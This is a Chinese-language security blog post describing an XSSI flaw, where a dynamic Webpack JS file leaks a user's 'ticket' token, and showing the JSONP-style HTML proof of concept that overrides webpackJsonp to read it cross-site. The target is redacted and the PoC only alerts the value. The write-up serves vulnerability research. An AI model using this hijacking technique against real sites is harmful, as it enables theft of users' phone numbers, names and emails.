---
layout: post
author: Vulkey_Chen
title: "[XSSI]动态JS劫持用户信息"
date: 2020-01-08
music-id: 
permalink: /archives/2020-01-08/3
description: "[XSSI]动态JS劫持用户信息"
---

# 动态JS劫持用户信息

**Webpack+JSONP劫持**

作者：key

注：本文已对敏感信息脱敏化，如有雷同纯属巧合。

## 前言

在做测试的时候发现一个请求：

```http
POST /user/getUserInfo HTTP/1.1
Host: xxxxx
Cookie: xxxx

ticket=xxxxx
```

其对应返回的信息包含了我本身用户的敏感信息：手机号、姓名、邮箱...

通过BurpSuite的插件`Logger++`搜索发现该`ticket`值居然出现在了JS文件中：

![-w699](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-01-08/15782203133182.jpg)

## 确定漏洞

通过测试我发现以上所述请求中的`Cookie`为无效请求头，后端不对齐校验，但对`ticket`校验，也就说明此处的`ticket`代表了获取用户信息的关键参数，换种说法：**当你知道用户的`ticket`参数即可获取该用户信息**。

## 判断JS动静态

当我在`Logger++插件`搜索到`ticket值`存在JS文件内容时，我的第一想法就是这个JS文件为动态类型，其文件内容跟随用户凭证字段的变化而变化。

测试：删除Cookie字段，结果：`ticket`参数值消失，由此可以判断该JS内容为动态类型。

再尝试将测试账户A的Cookie字段内容替换为测试账户B的Cookie字段内容，结果：`ticket`参数值变为测试账户B用户的对应值，由此可以判断该JS文件路径是固定的，并不是动态路径。

## Webpack+JSONP劫持

已知JS文件路径为：`https://website/app.xxxxx.js`

查看其文件内容发现其被Webpack打包过：

![-w143](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-01-08/15782208726972.jpg)

那么我们想要劫持这个JS文件内容其实就可以使用JSONP的PoC代码（因为这段JS文件内容就是`自定义函数+传入参数`）：

```javascript
<script>
function webpackJsonp(data) {
	alert(data)
}
</script>
<script src="https://website/app.xxxxx.js"></script>
```

但这样得不到我们想要的`ticket`值，简单的看了下JS代码，这段JS代码内容的格式是这样的：

webpackJsonp 函数传入两个参数：第一个参数毫无用处，第二个参数传入的值包含了我们想要的`ticket`值。

那以上代码就可以这样修改：

```javascript
<script>
function webpackJsonp(data, data1) {
	alert(data1)
}
</script>
<script src="https://website/app.xxxxx.js"></script>
```

但我们还是没得到我们想要的信息：

![-w517](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-01-08/15782215229911.jpg)

因为第二段参数传入的值还需要进行解析，我发现这段值内容就是一段JSON对象，而对象的每个属性都在定义一个函数：

![-w411](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-01-08/15782216768669.jpg)

寻找`ticket`所在函数位置，发现其在`jbTV: function...`内，知道了所在函数位置，PoC代码只需要这样进行构建：

```javascript
<script>
function webpackJsonp(data, data1) {
	alert(data1['jbTV'])
}
</script>
<script src="https://website/app.xxxxx.js"></script>
```

访问，成功获取：

![-w1239](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-01-08/15782218407604.jpg)

后面只需要稍微的加个正则就可以了～

## 攻击方式

用户登录状态，访问该漏洞页面，触发即可获取到`ticket`值，将该值带入以上所列请求中即可越权获取用户信息

# 结尾

心细一点，漏洞就在眼前，
